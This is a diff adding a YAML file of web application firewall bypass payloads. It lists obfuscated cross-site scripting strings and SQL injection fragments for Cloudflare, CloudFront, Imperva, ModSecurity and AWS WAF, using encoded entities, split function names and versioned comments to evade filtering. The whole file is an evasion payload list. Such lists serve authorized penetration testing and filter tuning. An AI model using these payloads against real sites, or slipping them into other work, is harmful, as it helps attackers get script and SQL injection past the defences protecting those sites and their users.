@@ -1,0 +1,24 @@
+id: bypass_waf
+name: WAF Bypass Payloads
+
+wafs:
+  cloudflare:
+    payloads:
+      - '<svg onload=alert%26%230000000040"1")>'
+      - '<details/open/ontoggle="self[`aler`+`t`](1)">'
+      - '<img%20LJ%20DEf%20SRC=%20onerror=prompt(1);>'
+    sqli:
+      - "/*!50000SELECT*/ /*!50000FROM*/"
+      - "1'%20or%201=1%20--%20-"
+  cloudfront:
+    payloads:
+      - '">%3Cimg%20src=x%20onerror=confirm(1);>'
+  imperva:
+    payloads:
+      - '<details/open/ontoggle="self[`aler`+`t`](1)">'
+  modsecurity:
+    payloads:
+      - '<img src=x onerror=prompt(1)>'
+  aws_waf:
+    payloads:
+      - '<details open ontoggle=confirm(1)>'
